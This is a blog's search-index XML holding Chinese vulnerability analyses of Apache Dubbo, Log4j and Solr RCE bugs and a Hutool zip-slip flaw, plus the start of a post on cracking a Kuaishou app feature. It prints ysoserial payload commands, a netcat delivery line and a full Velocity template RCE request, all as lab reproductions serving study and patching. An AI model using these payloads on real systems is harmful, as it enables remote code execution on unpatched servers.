<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Apache Dubbo反序列化漏洞分析</title>
      <link href="/Apache%20Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/Apache%20Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<h2 id="1、漏洞相关信息"><a href="#1、漏洞相关信息" class="headerlink" title="1、漏洞相关信息"></a>1、漏洞相关信息</h2><p><strong>漏洞名称</strong>：Apache Dubbo反序列化漏洞</p><p><strong>漏洞编号</strong>：CVE-2019-17564</p><p><strong>漏洞描述</strong>：</p><p>​    Apache Dubbo是一个分布式框架，致力于提供高性能透明化的RPC远程服务调用方案，以及SOA服务治理方案。Apache Dubbo在实际应用场景中主要负责解决分布式的相关需求。</p><p>   Apache Dubbo支持多种协议，官方推荐使用 Dubbo 协议，CVE-2019-17564是属于Apache Dubbo HTTP协议中的一个反序列化漏洞，该漏洞的主要原因在于当Apache Dubbo启用HTTP协议之后，Apache Dubbo在接受来自消费者的远程调用请求的时候存在一个不安全的反序列化行为，最终导致了远程任意代码执行。</p><h2 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h2><ul><li>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4.1</li><li>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</li><li>Apache Dubbo = 2.5.x</li></ul><h2 id="3、环境搭建"><a href="#3、环境搭建" class="headerlink" title="3、环境搭建"></a>3、环境搭建</h2><p>下载地址：<a href="https://github.com/apache/dubbo-samples/tree/master/java/dubbo-samples-http" target="_blank" rel="noopener">https://github.com/apache/dubbo-samples/tree/master/java/dubbo-samples-http</a></p><ol><li>下载源码后，将Dubbo的版本改成2.7.3</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcizhbphqtj317m0r4wmy.jpg" alt=""></p><ol start="2"><li><p>搭建 zookeeper</p></li><li><p>在pom.xml中加入<strong>gadget</strong>，在利用中使用了反序列化工具<strong>ysoserial</strong>， 利用链<strong>CommonsCollections2</strong> 需要第三方库文件 <strong>commons-collections4</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="4、漏洞利用"><a href="#4、漏洞利用" class="headerlink" title="4、漏洞利用"></a>4、漏洞利用</h2><ol><li><p>使用<strong>ysoserial</strong>生产反序列化文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections2  &quot;open /Applications/Calculator.app&quot; &gt; payload.ser</span><br></pre></td></tr></table></figure></li><li><p>在<code>/org.apache.dubbo.samples.http.api.DemoService</code>接口POST输入序列化的文件内容</p></li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcj08ze3awj31bx0u07wh.jpg" alt=""></p><h2 id="5、-漏洞分析"><a href="#5、-漏洞分析" class="headerlink" title="5、 漏洞分析"></a>5、 漏洞分析</h2><p>从返回结果的报错调用栈可以定位到入口点<code>javax.servlet.http.HttpServlet.service</code>。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcj0f8kqkvj30v50u0tnb.jpg" alt=""></p><p>在<code>javax.servlet.http.HttpServlet.service</code>断点调试，处理HTTP请求的request和response。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcj0lv6suqj31o20duq7i.jpg" alt=""></p><p>跟进到<code>dubbo-2.7.3.jar!/org/apache/dubbo/remoting/http/servlet/DispatcherServlet</code>，会有一个if判断，如果handler对象为空就会返回404，提示”Service not found”，否则会继续调用handle方法。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcj0q2je05j31li0ewadi.jpg" alt=""></p><p>继续跟进到<code></code>dubbo-2.7.3.jar!/org/apache/dubbo/rpc/protocol/http/HttpProtocol<code>的</code>handle<code>方法中，这里dubbo使用http协议传输数据交互，</code>handle<code>方法首先会判断是否为POST请求，如果不是会返回500状态码，如果是POST请求会从request中获取remoteAddr和remotePort，然后会进入到</code>skeleton.handleRequest`处理。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcj0xwdidlj31ti0muaga.jpg" alt=""></p><p>跟进<code>spring-web-4.3.16.RELEASE.jar!/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter</code>中的<code>handleRequest</code>方法，这里调用的是 <strong>spring</strong> 的 <strong>httpinvoker</strong> ，其中 <strong>readRemoteInvocation</strong> 会处理我们传入的 <strong>request</strong> 对象。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcj16nv9m3j31xw0e80xc.jpg" alt=""></p><p>跟进RemoteInvocation，会返回<code>RemoteInvocation.readRemoteInvocation</code>的处理结果。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcj1h0s5mej31ug04w40i.jpg" alt=""></p><p>继续跟进，这里会调用<code>doReadRemoteInvocation</code>来针对数据流进行处理</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcj1io6kaij31wm0iaadv.jpg" alt=""></p><p>跟进<code>doReadRemoteInvocation</code>，会进入到<code>spring-context-4.3.16.RELEASE.jar!org/springframework/remoting/rmi</code>，反序列化的入口在这里，其中ois为我们传入的POST数据，由于我们没有对ois进行校验，直接调用<code>readObject</code>方法，这就会导致RCE。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcj1k92l5aj31uq0cq0w9.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcj1r9sy60j31s00u0tm8.jpg" alt=""></p><h2 id="6、漏洞修复"><a href="#6、漏洞修复" class="headerlink" title="6、漏洞修复"></a>6、漏洞修复</h2><p>在分析中可以知道Dubbo2.7.3中<strong>handleRequest</strong>主要是调用<strong>spring</strong> 的 <strong>httpinvoker</strong>，而在Dubbo2.7.5中是是通过<strong>jsonrpc</strong>，首先在<code>/org/apache/dubbo/rpc/protocol/http/HttpProtocol</code>的<code>handle</code>方法中会实例化一个<strong>JsonRpcServer</strong>对象<strong>skeleton</strong>来处理uri，紧接着调用<strong>skeleton</strong>对象中的<strong>handle</strong>方法</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcj329dfmuj327h0u015r.jpg" alt=""></p><p>在<code>/com/googlecode/jsonrpc4j</code>中的<code>handle</code>方法中如果无法处理传输Java序列化字节流，就会抛出异常。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcj2vgvlw7j328u0m8q7d.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcj3da4hisj31gu0u0aum.jpg" alt=""></p><h2 id="7、参考链接"><a href="#7、参考链接" class="headerlink" title="7、参考链接"></a>7、参考链接</h2><ul><li><p><a href="https://www.cnkirito.moe/dubbo-http-protocol/" target="_blank" rel="noopener">https://www.cnkirito.moe/dubbo-http-protocol/</a></p></li><li><p><a href="https://paper.seebug.org/1128/" target="_blank" rel="noopener">https://paper.seebug.org/1128/</a></p></li><li><p><a href="http://www.lmxspace.com/2020/02/16/Apache-Dubbo反序列化漏洞（CVE-2019-17564）/" target="_blank" rel="noopener">http://www.lmxspace.com/2020/02/16/Apache-Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89/</a></p></li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> Apache Dubbo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Log4j 反序列化漏洞分析</title>
      <link href="/Log4j-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/Log4j-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1、漏洞相关信息"><a href="#1、漏洞相关信息" class="headerlink" title="1、漏洞相关信息"></a>1、漏洞相关信息</h2><p><strong>漏洞名称</strong>：Apache Log4j反序列化漏洞</p><p><strong>漏洞编号</strong>：CVE-2019-17571</p><p><strong>漏洞描述</strong>：</p><p>Log4j是Apache开发的一款基于Java的开源日志工具，可以将Web项目中的日志输出到控制台，文件，GUI组件，甚至是套接口服务器。此漏洞是因为Log4j在启动套接字服务器后，对监听端口传入的反序列化数据没有进行过滤，导致可以结合反序列化工具，利用SocketServe类远程执行任意代码。</p><h2 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h2><p>Apache Log4j &lt;= 1.2.7</p><h2 id="3、环境搭建"><a href="#3、环境搭建" class="headerlink" title="3、环境搭建"></a>3、环境搭建</h2><p>本次环境为Log4j1.2.17和JDK1.7</p><p>1、新建maven项目，在pom中添加Log4j 1.2.17</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcp697nbihj311c07kq3y.jpg" alt=""></p><p>2、测试代码</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcp606vbqfj31ec0eyq5x.jpg" alt=""></p><h2 id="4、漏洞利用"><a href="#4、漏洞利用" class="headerlink" title="4、漏洞利用"></a>4、漏洞利用</h2><p>1、使用<strong>ysoserial</strong>生产反序列化文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-<span class="number">30099844</span>c6-<span class="number">1</span>.jar Jdk7u21 <span class="string">"open /Applications/Calculator.app"</span> &gt; payload2.ser</span><br></pre></td></tr></table></figure><p>2、启动Log4j套接口日志服务器，监听4444端口</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcp69x0u1wj31f00u0k0g.jpg" alt=""></p><p>3、发送POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload2.ser | nc 127.0.0.1 4444</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcp6aq4pn6j318x0u0wt6.jpg" alt=""></p><h2 id="5、漏洞分析"><a href="#5、漏洞分析" class="headerlink" title="5、漏洞分析"></a>5、漏洞分析</h2><p>在<strong>SimpleSocketServer</strong>主方法处打断点调试，当启动套接字服务器，会监听设置的端口</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcp6e2da1aj31x40kkn1b.jpg" alt=""></p><p>跟进<code>log4j-1.2.17.jar!org/apache/log4j/net/SimpleSockerServer</code></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcp7c1bz2vj31mx0u0k20.jpg" alt=""></p><p>继续跟进，当我们接收到的socket数据传入进行处理会调用<strong>SocketNode</strong>类</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcp7dbfpszj31eh0u0n82.jpg" alt=""></p><p>跟进<code>log4j-1.2.17.jar!org/apache/log4j/net/SocketNode</code>，可以看到在<strong>SocketNode</strong>方法中创建了一个<strong>ObjectInputStream</strong>对象直接获取socket输入流进行序列化，最后在<strong>run</strong>方法中直接调用readObject()进行反序列化操作。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcp7kqep0wj31ty0u0n5j.jpg" alt=""></p><h2 id="6、参考链接"><a href="#6、参考链接" class="headerlink" title="6、参考链接"></a>6、参考链接</h2><p><a href="https://mp.weixin.qq.com/s/RLvvzKbBwKp-War98pvn9w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RLvvzKbBwKp-War98pvn9w</a></p>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> Log4j </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Apache Solr Velocity 模板注入RCE漏洞分析</title>
      <link href="/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<h2 id="1、漏洞描述"><a href="#1、漏洞描述" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h2><p>由于Solr默认未开启登录认证，只需请求<strong>/节点名/config</strong>,将配置项<strong>params.resource.loader.enabled</strong>设置为<strong>true</strong>，再构造链接即可让Solr中的<strong>Velocity</strong>模版引擎渲染传入的<strong>恶意模版</strong>，造成命令执行。</p><h2 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h2><p>Apache Solr 5.x — Apache Solr 8.2.0</p><h2 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h2><p><strong>测试版本：</strong> Solr 8.2</p><p>首先登录solr控制台，直接请求<strong>/节点名/config</strong>，修改配置项，Apache Solr默认集成<strong>VelocityResponseWriter</strong>插件，该插件初始化参数中的<strong>params.resource.loader.enabled</strong>默认值设置为false，但是可以通过POST请求直接修改配置项，将其设置为true。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">      &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">        &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">        &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">        &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">        &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">        &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l2hiw5laj326a0h0wiw.jpg" alt=""></p><p>接下来就可以构造一个自定义的Velocity模版，实现执行任意系统命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l2oa8derj326i0fmtei.jpg" alt=""></p><h2 id="4、漏洞分析"><a href="#4、漏洞分析" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h2><p>首先从payload触发的漏洞链入手，在</p><p><code>/solr-8.2.0/solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java</code>处<strong>responseWriter</strong>进行调试</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9kzeyijesj320u0u07h3.jpg" alt=""></p><p>跟进后，可以看到Solr是根据<strong>wt</strong>的参数值来确定数据的返回格式，也就是用<strong>Velocity</strong>来作为模板来渲染，如果模板的内容可控，我们就可以通过构造恶意模板来执行任意命令。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9kzj0jhv8j31k60aa41q.jpg" alt=""></p><p>往下走，会进入到<code>/solr-8.2.0/solr/core/src/java/org/apache/solr/response/QueryResponseWriterUtil.java</code>的<strong>writeQueryResponse</strong>方法</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9kzt66e2tj31op0u0tmt.jpg" alt=""></p><p>继续跟进<code>/solr-8.2.0/solr/core/src/java/org/apache/solr/response/VelocityResponseWriter.java</code>中，因为payload中<strong>wt</strong>传入的参数是<strong>velocity</strong>，所以会创建对应的<strong>QueryResponseWriter</strong>的类型，为<strong>VelocityResponseWriter</strong></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l03dap0pj31nq0kwn32.jpg" alt=""></p><p>跟进<strong>createEngine()</strong>方法，这里Solr首先会创建一个模板引擎对象<strong>engine</strong></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l06ei1lzj31n60gowk8.jpg" alt=""></p><p>继续往下走，这里会判断<strong>VelocityResponseWriter</strong>插件的<strong>eparams.resource.loader.enabled</strong>选项是否为true。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l0btjp0dj31o00i4n30.jpg" alt=""></p><p>跟进<strong>SolrParamResourceLoader()</strong>到<code>/solr-8.2.0/solr/core/src/java/org/apache/solr/response/SolrParamResourceLoader.java</code>文件中</p><p>如果ConfigAPI开启了<strong>params.resource.loader.enabled</strong>选项，就会从HTTP请求中获取参数，如模版名称。</p><p>它会解析我们传入的参数，并对<strong>v.template</strong>参数进行处理</p><p>解析了前端传来的所有参数，并对<code>v.template.</code>开头的参数进行处理，我们请求的参数为<strong>q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=恶意模版内容</strong></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l0zujn4yj31ns0kc0zb.jpg" alt=""></p><p>所以进入<strong>templates</strong>模版<strong>map</strong>的<strong>key</strong>是<strong>custom.vm</strong>，<strong>value</strong>就是我们指定的<strong>恶意模版内容</strong></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l176mz3sj31gu0u04fk.jpg" alt=""></p><p>然后我们会重新回到<code>/solr-8.2.0/solr/core/src/java/org/apache/solr/response/VelocityResponseWriter.java</code>中的<strong>write()</strong>方法</p><p>不管<strong>wrapResponse</strong>是true或者false，最终都会被<strong>template.merge()</strong>，进行合并渲染，触发漏洞。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l1pbi3q9j31my0qu7cq.jpg" alt=""></p><h2 id="5、漏洞修复"><a href="#5、漏洞修复" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h2><p>将Apache Solr升级至最新版本</p><p>临时修补建议：</p><ul><li><p>编辑<code>solrconfig.xml</code>，将所有用固定值配置的<code>DataImportHandler</code>用法中的<code>dataConfig</code>参数设置为空字符串。</p></li><li><p>确保网络设置只允许可信的流量与Solr进行通信，特别是与DIH请求处理程序的通信。</p></li></ul><h2 id="6、参考链接"><a href="#6、参考链接" class="headerlink" title="6、参考链接"></a>6、参考链接</h2><ul><li><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></li><li><a href="http://gv7.me/articles/2019/apache-solr-velocity-rce-20191031/" target="_blank" rel="noopener">http://gv7.me/articles/2019/apache-solr-velocity-rce-20191031/</a></li><li><a href="https://xz.aliyun.com/t/6700" target="_blank" rel="noopener">https://xz.aliyun.com/t/6700</a></li><li><a href="https://mp.weixin.qq.com/s/pPCNQoumpRvaUGkVxVvwBA?" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/pPCNQoumpRvaUGkVxVvwBA</a></li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> Solr </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hutool任意文件覆盖漏洞分析</title>
      <link href="/Hutool%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/Hutool%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><script type="text/javascript" src="/js/src/bai.js"></script><h2 id="1-漏洞相关信息"><a href="#1-漏洞相关信息" class="headerlink" title="1.漏洞相关信息"></a>1.漏洞相关信息</h2><p><strong>漏洞名称</strong>：Hutool任意文件覆盖漏洞</p><p><strong>漏洞编号</strong>：CVE-2018-17297</p><p><strong>漏洞描述</strong>：攻击者可以恶意构造Zip压缩文件，通过路径遍历覆盖任意文件，是“任意文件覆盖”和“目录遍历”问题的结合，攻击者可以将文件解压缩到正常解压缩路径之外并覆盖敏感文件</p><p><strong>漏洞原理</strong>：zipEntry.getName()创建新文件时未做校验，如果攻击者通过上传目录中带有../的恶意zip文件，即可c穿越路径覆盖文件</p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2.环境搭建"></a>2.环境搭建</h2><h3 id="Libraries："><a href="#Libraries：" class="headerlink" title="Libraries："></a>Libraries：</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ZipController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vulnerability.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.ZipUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ZipController</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ZipUtil.unzip(<span class="string">"/Users/sqyy/Desktop/password.zip"</span>,<span class="string">"../../test/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3.漏洞分析"></a>3.漏洞分析</h2><p>在<strong>hutool-all-4.1.11.jar!cn/hutool/core/util/ZipUtil.class</strong></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6gy1g8927jtzzmj30xn0kc776.jpg" alt=""></p><p>我们可以看到<code>unzip</code>这个函数分别有三个参数，分别代表</p><blockquote><ul><li>zipFile：表示需要解压的压缩文件</li><li>outFile：压缩文件解压到的目录</li><li>charset：表示编码的格式</li></ul></blockquote><p>而在第204行可以看到解压的目录在创建时，文件名是直接使用的<strong>zipEntry.getName()</strong>，没有进行校验，那么我们的zip文件可以包含<code>../</code>等目录穿越字符</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6gy1g89287bbvbj31ih0u0n4e.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6gy1g8928gt0txj31ji0hs0x1.jpg" alt=""></p><p>此问题和<strong>Spring Integration Zip不安全解压漏洞</strong>相似，可以参考<a href="https://www.sqyysec.com/Spring-Integration-Zip不安全解压（CVE-2018-1261）漏洞分析/" target="_blank" rel="noopener">https://www.sqyysec.com/Spring-Integration-Zip不安全解压（CVE-2018-1261）漏洞分析/</a></p><h2 id="4-漏洞修复"><a href="#4-漏洞修复" class="headerlink" title="4.漏洞修复"></a>4.漏洞修复</h2><p>在<strong>hutool-all-4.1.12.jar!cn/hutool/core/io/FileUtil.class</strong>添加了一个checkSlip的安全检测方法，方法中检查父完整路径是否为自路径的前半部分，如果不是则说明不是子路径，可能存在slip注入。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8925offmgj31xb0p4th6.jpg" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.cnblogs.com/jinqi520/p/11159232.html" target="_blank" rel="noopener">https://www.cnblogs.com/jinqi520/p/11159232.html</a></li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 任意文件覆盖 </tag>
            
            <tag> 目录遍历 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Android逆向之旅-爆破开启快手App的长视频拍摄权限功能</title>
      <link href="/Android%E9%80%86%E5%90%91%E4%B9%8B%E6%97%85-%E7%88%86%E7%A0%B4%E5%BC%80%E5%90%AF%E5%BF%AB%E6%89%8BApp%E7%9A%84%E9%95%BF%E8%A7%86%E9%A2%91%E6%8B%8D%E6%91%84%E6%9D%83%E9%99%90%E5%8A%9F%E8%83%BD/"/>
      <url>/Android%E9%80%86%E5%90%91%E4%B9%8B%E6%97%85-%E7%88%86%E7%A0%B4%E5%BC%80%E5%90%AF%E5%BF%AB%E6%89%8BApp%E7%9A%84%E9%95%BF%E8%A7%86%E9%A2%91%E6%8B%8D%E6%91%84%E6%9D%83%E9%99%90%E5%8A%9F%E8%83%BD/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1、功能说明"><a href="#1、功能说明" class="headerlink" title="1、功能说明"></a>1、功能说明</h2><p>​    在前几天有人问我快手发布了内侧发布长视频的功能，他找快手小助手申请了但是没有回复，所以我就有空通过代码层面让他有这个功能看看效果如何，这个其实网上已经有很多人在说这个功能了，我们百度一下就找到了这张演示图：</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g658u7zl1sj30dw0dvwfu.jpg" alt=""></p><p>这个也是需要去快手官方申请权限的，这里看到如果要是成功了，在视频裁剪页面会有一个发布完整视频的按钮，所以我们通过这个入口操作接口。</p><h2 id="2、逆向分析"><a href="#2、逆向分析" class="headerlink" title="2、逆向分析"></a>2、逆向分析</h2><p>当然这里有很多方式操作，可以apktool反编译通过这个文案找到入口，也可以通过ui工具获取当前页面的控件资源id信息作为入口，当然我们选择比较简单的直接获取当前页面的activity方式操作：</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g658yyhgj9j30qq190gow.jpg" alt=""></p><p>我们进入这个页面之后直接运行命令：<strong>adb shell dumpsys activity top</strong></p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g658za3icqj30u004iwfm.jpg" alt=""></p><p>反编译之后的代码中全局搜索这个类：<strong>find . |xargs grep -ri “MixImporterActivity”</strong></p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g658zl70vcj30sq0bsdk0.jpg" alt=""></p><p>看到在第六个dex中，直接用jadx打开这个dex即可：</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g65900ki31j30u00i4gs3.jpg" alt=""></p><p>继续查看代码：</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g65907rzcfj30qk08idhi.jpg" alt=""></p><p>查看Fragment的代码：</p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g6590kywl9j30u00rxaga.jpg" alt=""></p><p>看到快手用到的是MVP模式操作，直接看到有个长视频功能的：</p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g6590u23y5j30ta0jiwie.jpg" 